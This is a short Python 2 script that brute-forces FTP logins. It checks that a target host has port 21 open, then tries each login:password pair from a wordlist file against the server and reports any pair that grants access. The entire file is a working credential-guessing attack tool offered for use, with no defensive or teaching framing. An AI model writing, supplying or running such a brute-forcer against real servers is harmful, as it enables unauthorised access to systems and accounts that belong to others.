# coding:utf-8
import ftplib
import socket
from sys import argv, exit
from os import path

if len(argv) < 3:
    print("Usage: %s 'host' 'login-pass.txt'" % path.basename(argv[0]))
    exit(-1)

HOSTNAME = str(argv[1])
DIC = argv[2]
TIME_OUT = 0.25
FAMOST_DIC = [
    'admin',
    'ftp',
    'root',
    'test',
    'user',
    'webmaster'
]  
PORT = 21


def tcping(hostname, port=21):
    s = socket.socket()
    s.settimeout(TIME_OUT)
    try:
        s.connect((hostname, port))
        s.close()
        return True
    except:
        return False


def dic_counter(data):
    counter = 0
    with open(data, 'r') as file:
        for line in file:
            counter += 1
    return counter


def check_login(hostname, login, password, timeout):
    global TIME_OUT
    try:
        ftp = ftplib.FTP(hostname, timeout=timeout)
        TIME_OUT -= 0.01
        if ftp.login(user=login, passwd=password):
            ftp.close()
            return True
    except KeyboardInterrupt:
        print ('Script stopped by keyboard')
        exit(-1)
    except socket.error:
        TIME_OUT += 0.15
        print '[!] Timeout is increased to: %s sec' % TIME_OUT
    except Exception as err:
        # print '[-] Connection to %s error: %s' % (hostname, err)
        pass


def read_file(filename):
    login_pairs = []
    with open(filename, 'r') as file:
        for line in file:
            line = line.strip()
            try:
                login_pairs.append(line.split(':'))
            except Exception as e:
                print '[-] Bad format: %s' % line
                print e
    return login_pairs


if __name__ == '__main__':
    if not tcping(HOSTNAME):
        print '[!] Host %s is down!' % HOSTNAME
        exit(-1)
    creds = read_file(DIC)
    for login_pass in creds:
        login, password = login_pass
        print "[!] Log-in with %s:%s" % (login, password)
        if check_login(HOSTNAME, login, password, TIME_OUT):
            print '[+] Access granted to %s! Login: %s, Password: %s' % (HOSTNAME, login, password)
    print '[!] BruteForce done... '